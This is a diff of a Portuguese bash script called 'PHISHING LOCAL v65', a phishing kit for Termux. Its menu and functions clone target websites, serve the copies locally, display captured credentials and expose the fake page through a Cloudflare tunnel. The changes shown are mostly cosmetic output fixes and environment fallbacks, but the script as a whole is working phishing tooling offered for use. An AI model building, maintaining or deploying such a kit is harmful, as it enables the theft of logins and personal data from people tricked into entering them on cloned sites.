@@ -1,8 +1,12 @@
 #!/bin/bash
 # ============================================
-# 🎣 PHISHING LOCAL v49 - Clonador Profissional
+# 🎣 PHISHING LOCAL v65 - Clonador Profissional
 # 1 Phish 2 Capturas 3 Tunel 4 Historico 5 Colar 6 Config 7 Status 8 Parar 9 Salvos 0 Sair
 # ============================================
+
+# Fallback para HOME se não estiver definido
+[ -z "$HOME" ] && HOME="/data/data/com.termux/files/home"
+[ -z "$SCRIPT_DIR" ] && SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 
 RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
 CYAN='\033[0;36m'; PURPLE='\033[0;35m'; WHITE='\033[1;37m'; NC='\033[0m'
@@ -232,8 +236,8 @@ clone_site() {
         echo -e "  ${YELLOW}Solucoes:${NC}"
         echo -e "  - Use ${WHITE}https://${NC} ao inves de http"
         echo -e "  - Sem proxy: ${WHITE}curl -sL ${target_url} | head -20${NC}"
-        echo -e "  - Se bloqueou: use ${WHITE}[5] COLAR HTML${NC} (copia do navegador)"
-        echo -e "  - Se SPA (Angular/React): ${WHITE}COLAR HTML${NC} e informa o dominio"
+        echo -e "  - Se bloqueou: use ${WHITE}[5] COLAR HTML${NC} - copia do navegador"
+        echo -e "  - Se SPA - Angular/React: ${WHITE}COLAR HTML${NC} e informa o dominio"
         echo ""
         echo -e "${YELLOW}Pressione Enter...${NC}"
         read
@@ -271,7 +275,7 @@ clone_site() {
     [ -z "$tech_title" ] && tech_title=$(echo "$target_url" | sed -E 's|.*://||;s|/$||')
 
     if [ "$is_spa" = "1" ]; then
-        echo -e "  Tech: ${RED}$spa_type \(SPA\)${NC}"
+        echo -e "  Tech: ${RED}$spa_type - SPA${NC}"
         echo -e "  Titulo: $tech_title"
         echo -e "  HTML: ${html_size} bytes"
         echo -e "  ${RED}-> Site 100% JS. Clone real NAO e possivel.${NC}"
@@ -501,7 +505,7 @@ ENDSPA
         else
             local html_sz=$(wc -c < "$SITE_DIR/index.html" 2>/dev/null | tr -d ' ')
             echo -e "${GREEN}[OK] Servidor rodando! PID: $pid${NC}"
-            echo -e "${GREEN}[OK] http://${my_ip}:${port}${NC} (${html_sz} bytes)"
+            echo -e "${GREEN}[OK] http://${my_ip}:${port}${NC} - ${html_sz} bytes"
         fi
     else
         echo -e "${RED}[ERRO] Servidor nao subiu - caiu${NC}"
@@ -566,7 +570,7 @@ view_capturas() {
 
     echo ""
     echo -e "${YELLOW}1) Limpar${NC}"
-    echo -e "${YELLOW}2) Tempo real (Ctrl+C = voltar)${NC}"
+    echo -e "${YELLOW}2) Tempo real - Ctrl+C = voltar${NC}"
     echo -e "${YELLOW}Enter) Voltar${NC}"
     echo -n "> "
     read CHOICE
@@ -618,7 +622,7 @@ show_saved_clones() {
     if [ "$count" -eq 0 ]; then
         echo -e "  ${RED}Nenhum clone salvo ainda.${NC}"
         echo ""
-        echo -e "  ${YELLOW}Clone um site (opcao 1) e escolha 'salvar' no final.${NC}"
+        echo -e "  ${YELLOW}Clone um site - opcao 1 - e escolha salvar no final.${NC}"
         echo ""
         echo -e "${YELLOW}Press Enter...${NC}"
         read
@@ -646,7 +650,7 @@ show_saved_clones() {
         fi
 
         echo -e "  ${WHITE}[$idx]${NC} ${YELLOW}$(basename "$d")${NC}$active"
-        echo -e "       URL: ${WHITE}$url${NC} | Porta: ${port} | ${sz} (${files} arq) | ${date}"
+        echo -e "       URL: ${WHITE}$url${NC} | Porta: ${port} | ${sz} - ${files} arq | ${date}"
         echo ""
         idx=$((idx + 1))
     done
@@ -809,7 +813,7 @@ start_tunnel() {
         echo "$tunnel_url" > "$SCRIPT_DIR/.tunnel_link"
     else
         echo -e "${RED}  Tunel falhou!${NC}"
-        grep -qi "Error\|forbidden\|rate limit\|1101" "$TUNNEL_LOG" 2>/dev/null && echo -e "  ${RED}Cloudflare: tunel bloqueado (sem conta)${NC}"
+        grep -qi "Error\|forbidden\|rate limit\|1101" "$TUNNEL_LOG" 2>/dev/null && echo -e "  ${RED}Cloudflare: tunel bloqueado - sem conta${NC}"
         echo -e "  ${YELLOW}Solucao:${NC} cloudflared tunnel login"
         tail -5 "$TUNNEL_LOG" 2>/dev/null
     fi
@@ -1003,7 +1007,7 @@ show_status() {
     # Processos
     echo ""
     echo -e "  ${PURPLE}Processos:${NC}"
-    echo -n "  Servidor: "; [ -f "$SCRIPT_DIR/.server.pid" ] && kill -0 "$(cat $SCRIPT_DIR/.server.pid)" 2>/dev/null && echo -e "${GREEN}ON (PID $(cat $SCRIPT_DIR/.server.pid))${NC}" || echo -e "${RED}OFF${NC}"
+    echo -n "  Servidor: "; if [ -f "$SCRIPT_DIR/.server.pid" ] && kill -0 "$(cat $SCRIPT_DIR/.server.pid 2>/dev/null)" 2>/dev/null; then echo -e "${GREEN}ON${NC}"; else echo -e "${RED}OFF${NC}"; fi
     echo -n "  Tunel:    "; [ -f "$SCRIPT_DIR/.tunnel.pid" ] && kill -0 "$(cat $SCRIPT_DIR/.tunnel.pid)" 2>/dev/null && echo -e "${GREEN}ON${NC}" || echo -e "${RED}OFF${NC}"
 
     # Clone atual
